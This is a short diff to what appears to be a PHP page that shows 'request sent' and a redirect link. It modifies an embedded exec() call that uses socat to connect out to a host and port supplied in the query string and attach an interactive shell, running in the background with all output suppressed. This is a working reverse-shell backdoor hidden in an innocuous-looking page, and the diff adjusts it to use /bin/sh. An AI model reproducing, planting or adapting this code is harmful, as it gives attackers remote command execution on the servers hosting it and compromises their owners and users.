@@ -5,5 +5,5 @@ request sent
 <a href="/">redirect</a>
 
 <?php
-  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/bash,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &');
+  exec('env TERM=linux socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &');
 ?>
